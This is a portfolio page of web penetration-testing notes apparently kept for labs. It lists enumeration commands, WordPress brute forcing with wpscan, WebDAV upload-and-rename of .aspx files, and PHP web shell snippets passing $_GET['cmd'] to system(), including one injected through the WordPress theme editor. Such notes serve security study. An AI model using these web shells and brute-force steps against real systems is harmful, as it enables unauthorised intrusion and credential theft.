@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <link rel="stylesheet" href="../../../../../../assets/css/swiper-bundle.min.css">
+
+    <!--==================== CSS ====================-->
+    <link rel="stylesheet" href="../../../../../../assets/css/search.css">
+    <link rel="stylesheet" href="../../../../../../assets/css/method-styles.css">
+
+
+
+    <title>Methodology</title>
+</head>
+<body class="dark-theme">
+    <!--==================== HEADER ====================-->
+    <header class="header" id="header">
+        <nav class="nav container">
+            <a href="../../../../../index.html#home" class="nav__logo">Tyler O'Hare</a>
+            <div class="nav__menu" id="nav-menu">
+                <div class="search-bar">
+                <input type="text" id="searchInput" class="search-input" placeholder="Search Notes...">
+                <!-- <button onclick="search()" class="search-button">Search</button> -->
+                <div id="searchResults" class="search-results"></div>
+
+              </div>
+
+            </div>
+            <div class="nav__menu" id="nav-menu">
+                <ul class="nav__list grid">
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#home" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Home
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#skills" class="nav__link">
+                            <i class="uil uil-file-alt nav__icon"></i> Skills
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#portfolio" class="nav__link">
+                            <i class="uil uil-scenery nav__icon"></i> Portfolio
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../index.html#contact" class="nav__link">
+                            <i class="uil uil-estate nav__icon"></i> Contact Me
+                        </a>
+                    </li>
+                    <li class="nav__item">
+                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="nav__link active-link">
+                            <i class="uil uil-estate nav__icon"></i> Methodology
+                        </a>
+                    </li>
+                </ul>
+                <i class="uil uil-times nav__close" id="nav-close"></i>
+            </div>
+
+            <div class="nav__btns">
+                <!--Theme change button-->
+                <!-- <i class="uil uil-moon change-theme" id="theme-button"></i>
+
+                <div class="nav__toggle" id="nav-toggle">
+                    <i class="uil uil-apps"></i>
+                </div> -->
+            </div>
+        </nav>
+    </header>
+    <!--==================== END-HEADER ====================-->
+
+
+<!--==================== MAIN ====================-->
+    <main class="main"><article id="e2169090-e5f9-4061-9273-e961f0212c40" class="page sans"><header><h1 class="page-title">Web Methodology</h1><p class="page-description"></p></header><div class="page-body"><h2 id="939011a8-e33f-45bf-9521-bf0e33c7762e" class="">Application Mapping:</h2><p id="96df62e4-322b-41ef-b815-c68eaac8a391" class="">Passive Mapping with Burp:</p><ul id="0bbd9209-b2d8-4995-abb5-f31653e640c5" class="bulleted-list"><li style="list-style-type:disc"></li></ul><p id="f6e993a7-36ed-46db-be7c-35ceb9431ae7" class=""><strong>Content discovery:</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22cb625c-fdcb-4dc7-acdf-e62ab6a78303" class="code"><code class="language-Python">#search for these files on websites
+robots.txt
+sitemap.xml
+#Search for CMS versions, frameworks, secrets
+*View page source*
+#*Check favicon*
+curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum
+https://wiki.owasp.org/index.php/OWASP_favicon_database
+
+*Wappalyzer*</code></pre><p id="1b69abe4-526d-4729-aed4-83b20426f1b5" class=""><strong>gobuster (</strong>-k for https<strong>)</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bad21b6b-9626-4065-a0bc-45a8e9f7db5b" class="code"><code class="language-Bash">gobuster dir -w &lt;/usr/share/wordlists/dirbuster/directory&gt; -u http://&lt;ip&gt; -t 20</code></pre><p id="79e0a430-a6bd-4fc1-8dac-4bafe1b110c5" class="">
+</p><p id="bdf970c9-ba2e-4459-8a16-dfd527f555bf" class="">Nikto</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d253ae1a-473b-4653-bab1-4019269d39a8" class="code"><code class="language-Bash">nikto -host http://&lt;ip&gt;</code></pre><p id="56e53b23-90eb-4d56-951d-05838c3953ef" class="">
+</p><h2 id="e4781260-7f3a-4632-9b58-e7529b915735" class="">Framework Specific Endpoints:</h2><ul id="d4a87768-2c3e-41a6-91c8-eab7264d7a1e" class="bulleted-list"><li style="list-style-type:disc">/manager/html and /phpmyadmin</li></ul><ul id="7e837ae0-6015-491e-937d-35e5f1af3086" class="bulleted-list"><li style="list-style-type:disc">.htaccess and .htpasswd</li></ul><p id="59e8c42b-aba5-4a39-bc79-22eec4f16cdd" class="">
+</p><p id="b23599df-ba63-420d-b76c-c7527f9d0d43" class="">subdomain enumeration</p><ul id="384e461f-4026-41b3-b9f0-bf5aa6957bd7" class="bulleted-list"><li style="list-style-type:disc">amass</li></ul><ul id="2e6efad3-1ce1-4b2d-873f-64624599ffde" class="bulleted-list"><li style="list-style-type:disc">gobuster<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="09ac9238-7c43-46c8-ae97-d6c073a345e5" class="code"><code class="language-Bash">gobuster vhost -u &lt;url&gt; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30</code></pre></li></ul><p id="00327c03-c18c-46f6-8773-21ee51d1a84c" class="">
+</p><h2 id="21cd82b7-a4ae-4368-8ea9-ba3d8410e908" class="">Bypass 401 &amp; 403:</h2><ul id="993dcd9c-6b24-4677-b760-3f2ab8bbd869" class="bulleted-list"><li style="list-style-type:disc"><a href="https://latesthackingnews.com/2023/04/28/401-and-403-bypass-cheat-sheet-for-penetration-testers/amp/">https://latesthackingnews.com/2023/04/28/401-and-403-bypass-cheat-sheet-for-penetration-testers/amp/</a></li></ul><p id="d078f837-5c35-4f67-b679-31ad3ecbbcac" class="">
+</p><h2 id="c5002350-ba82-4656-a5ed-1df1894741b5" class="">HTTP Redirect :</h2><ul id="eb435adf-cce5-41e2-88f8-cba8b291746d" class="bulleted-list"><li style="list-style-type:disc">We can control a parameter that will redirect to a resource of our choice</li></ul><h2 id="876443fa-6cf7-467d-a65b-b33850b957ab" class=""><strong>HTTP Parameter Injection:</strong></h2><ul id="01e9c2be-fd11-495b-a128-6da1cea34b79" class="bulleted-list"><li style="list-style-type:disc">Injecting a parameter into a request that wasn&#x27;t intended to be there</li></ul><h2 id="e50e071f-61a1-4b93-89fc-2b818117cbc1" class=""><strong>HTTP Parameter Pollution:</strong></h2><ul id="f796ed91-cff3-409a-ae4c-d16910ab4a81" class="bulleted-list"><li style="list-style-type:disc">When we exploit the unknown behavior of having a parameter set 2 times in a request (Will it use the first or last occurrence of the parameters value?)</li></ul><h2 id="bdbbc855-ec14-462e-9721-76a803664329" class="">Cross Site Websocket Hijacking</h2><ul id="a80798a6-4833-4aa5-920e-d97d1c7286c4" class="bulleted-list"><li style="list-style-type:disc">Similar to CSRF  where we can listen in on established websocket connections that have no random tokens present.</li></ul><p id="fa8891c4-48f7-4cff-8ab0-2167962ad320" class="">
+</p><h2 id="b00afdbf-e3c8-46e1-82ad-f048373bc209" class="">Web Shells:</h2><p id="ac4f27e6-5d5d-437c-ade6-0b4e8586470b" class="">Sometimes web shells require cmd /c instead of taking the whole command</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="544ffee5-ffd9-46ee-8f23-d499c0803040" class="code"><code class="language-Python">cmd /c whoami</code></pre><p id="5cfc2710-e257-422c-8c85-29cea2a0bf28" class="">
+</p><p id="511ca271-a4a0-4ad0-ac84-d27296721ad2" class="">php </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="81faf8cb-ffa0-4277-8406-9201291e6197" class="code"><code class="language-Python">&lt;?php
+echo &quot;&lt;pre&gt;&quot;;
+passhtru($_GET[&#x27;cmd&#x27;]);
+system($_GET[&#x27;cmd&#x27;]);
+shell_exec($_GET[&#x27;cmd&#x27;]);
+exec($_GET[&#x27;cmd&#x27;]);
+pOpen($_GET[&#x27;cmd&#x27;]);
+eval(&quot;phpinfo()&quot;)
+
+echo&quot;&lt;/pre&gt;&quot;
+?&gt;</code></pre><p id="4cab3912-b062-4a45-a553-1ceb7f1b208b" class="">PHP:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7592552c-d763-48c8-9cde-21dbc0b8ab76" class="code"><code class="language-PHP">https://github.com/flozz/p0wny-shell</code></pre><p id="748f4cf5-8cca-4a05-892d-8bf34da81816" class="">aspx</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="aaf4b57e-02f9-40dc-82fd-57a9f6424f25" class="code"><code class="language-PHP">https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx</code></pre><h2 id="207da7d5-347f-44ef-8ff8-78f499d57e1e" class="">Webdav</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d7810c1c-fbd8-4cdb-a8f6-6c6555eb45f9" class="code"><code class="language-Python">cadaver http://0.0.0.0/webdav</code></pre><p id="068b166f-dbab-4523-bca6-4bfd017c1c1f" class="">Get the files that are available to be uploaded to the server</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a8ef8002-dc8c-427f-ac61-e9eea6e8a55a" class="code"><code class="language-Python">davtest -url http://0.0.0.0/webdav</code></pre><p id="9248cdd9-677d-43ee-b5ca-9cd285b46f96" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d3141cb8-eb49-4d9a-8dd5-c2f662b875b8" class="code"><code class="language-Python">curl http://0.0.0.0/ --upload-file file.txt
+#we can use curl to rename file after upload if there is an error uploading original filetype
+curl -X MOVE --header &quot;Destination:http://0.0.0.0/file.aspx&quot; http://0.0.0.0/file.txt</code></pre><h2 id="23ac88c7-e76e-4e10-9039-9e7fa7b1e120" class="">Wordpress</h2><p id="0de8aa76-6e93-4a31-9eb7-20948f1e1bad" class="">WPSCAN brute force</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7250735e-3e92-4a51-8bde-5b95d6527218" class="code"><code class="language-Python">proxychains wpscan --url http://localhost --wp-content-dir wp-admin --passwords /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt --usernames offsec -t 100</code></pre><p id="4cc5b3d2-9747-46ba-8055-087ea7e474c0" class="">
+</p><p id="62805756-24f9-4f96-b15f-fd09590929fe" class="">Wordpress:</p><ul id="4ef13051-fc15-4b11-8aa1-260ed6aa39ef" class="bulleted-list"><li style="list-style-type:disc">wp_config.php → credentials<ul id="e7e24a74-f644-47b0-b7c5-0f0963b06f96" class="bulleted-list"><li style="list-style-type:circle">usually var/www/ or var/www/wordpress</li></ul></li></ul><ul id="db8bd306-c140-4ddf-90c0-ae9037136cc0" class="bulleted-list"><li style="list-style-type:disc">robots.txt</li></ul><p id="c03b76cd-bf80-446f-bf39-f3bc454a3d59" class="">wpscan:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="42bad23d-40c9-4c87-8c59-c9037c004e2e" class="code"><code class="language-Bash">#enumrate users and vulnerable plugins
+wpscan --url &lt;url&gt; --api-token &lt;token&gt; -e u,vp
+
+#brute force
+wpscan --url &lt;url&gt; --api-token &lt;token&gt; -U &lt;user&gt; -P &lt;pass list&gt;</code></pre><p id="ae192899-1200-4838-a641-162ca7a8a43b" class="">-e enemurate</p><p id="a2b97597-2725-4154-ba13-a250e95f3728" class="">u - users</p><p id="2f7f81f9-3e03-416c-8936-7b59aaabd234" class="">vp - vulnerable plugins</p><p id="94c8a9c0-06a3-422c-8ddc-0b6f17146462" class="">api - &lt;redacted&gt;</p><p id="fecb300c-e482-47e1-b016-adaf78ee2528" class="">
+</p><ul id="74712bfe-358b-44b2-b14c-94a2dd4e03d4" class="bulleted-list"><li style="list-style-type:disc">Search <strong>var/www/wp-config.php for db passwords </strong></li></ul><p id="d20dfef0-bcec-4f2d-9c3d-27a7b83a4ed5" class="">
+</p><p id="b67b8357-0200-453a-a7c0-e10088da29e8" class="">Appearance → editor → index.php → </p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="752cb753-10cc-4a4f-b50e-a9fa0941e7dc" class="code"><code class="language-Python">&lt;?php 
+system($_GET[&#x27;cmd&#x27;]):</code></pre><p id="8307305e-4be3-4d52-a6bf-f99c929d2723" class="">
+</p><h2 id="58bd7064-df9a-4f9f-9f2a-851290a9e4b3" class="">Content Security Policy:</h2><ul id="616b4c83-7f03-42e9-8eaf-a250a1bf9fdb" class="bulleted-list"><li style="list-style-type:disc"><a href="https://content-security-policy.com/">https://content-security-policy.com/</a></li></ul><ul id="18476ba5-9ee9-4855-b62d-85a143365f03" class="bulleted-list"><li style="list-style-type:disc">If we would want to allow for inline</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="07a919bd-2c89-4b38-8418-9f7ade5bf0c3" class="code"><code class="language-XML">CSP:
+Content-Security-Policy: 
+script-src: &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;
+
+frame-ancestors:
+Sandbox:
+Content-Security-Policy: sandbox allow-scripts allow-modals
+
+
+JS eval function enabled</code></pre><p id="0c7f382e-9e17-4d48-8363-baaf38559d87" class="">
+</p><p id="51edba4d-a787-4b59-abf2-349998efd5be" class="">CSP Bypass:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="afa2e166-694b-42e5-a362-5d6731ea649d" class="code"><code class="language-XML">File upload -&gt; improper validation -&gt; upload file to CSP accepted site</code></pre><h2 id="c3e1ad62-95f1-4d21-9fd5-90e43cc41363" class="">Cache Control:</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="e1fb13e5-162d-44e2-a6f6-c0dfc4fa50bb" class="code"><code class="language-Java">max-age - Time in seconds where we can use a cached item (freshness)
+no-cache - Response can still be cached, but must be revalidated with the server before each reuse
+no-store - Response will not be cached by browser or intermediate caches (Proxy,CDN)</code></pre></div></article></main></main>
+
+    <!--==================== FOOTER ====================-->
+    <footer class="footer">
+        <div class="footer__bg">
+            <div class="footer__container container grid">
+                <div>
+                    <h1 class="footer__title">Tyler O'Hare</h1>
+                    <span class="footer__subtitle">Cybersecurity Engineer</span>
+                </div>
+
+                <ul class="footer__links">
+                    <li>
+                        <a href="../../../../../index.html#skills" class="footer__link">Skills</a>
+                    </li>
+
+                    <li>
+                        <a href="../../../../../index.html#portfolio" class="footer__link">Portfolio</a>
+                    </li>
+
+                    <li>
+                        <a href="../../../../../../../index.html#contact" class="footer__link">Contact</a>
+                    </li>
+                    <li>
+                        <a href="../../../../../../assets/methodology/Methodology 19cd72eed635478e9a62ace908da0449.html" class="footer__link">Methodology</a>
+                    </li>
+                </ul>
+
+                <div class="footer__socials">
+                    <a href="https://github.com/tyohare" target="_blank" class="footer__social">
+                        <i class="uil uil-github-alt"></i>
+                    </a>
+
+                    <a href="https://www.linkedin.com/in/tyler-ohare-72b26923a/" target="_blank" class="footer__social" class="footer__social">
+                        <i class="uil uil-linkedin-alt"></i>
+                    </a>
+                </div>
+            </div>
+
+            <p class="footer__copy">&#169; Tyler O'Hare. All rights reserved.</p>
+        </div>
+
+    </footer>
+    <!--==================== END-FOOTER ====================-->
+
+
+    <!--==================== SCROLL TOP ====================-->
+    <a href="" class="scrollup" id="scroll-up">
+        <i class="uil uil-arrow-up scroll__icon"></i>
+    </a>
+
+    <!--==================== SWIPER JS ====================-->
+    <script src="../../../../../../assets/js/swiper-bundle.min.js"></script>
+
+    <!--==================== MAIN JS ====================-->
+    <script src="../../../../../../assets/js/main.js"></script>
+    <script src="../../../../../../assets/js/search.js"></script>
+
+
+</body>
+</html>
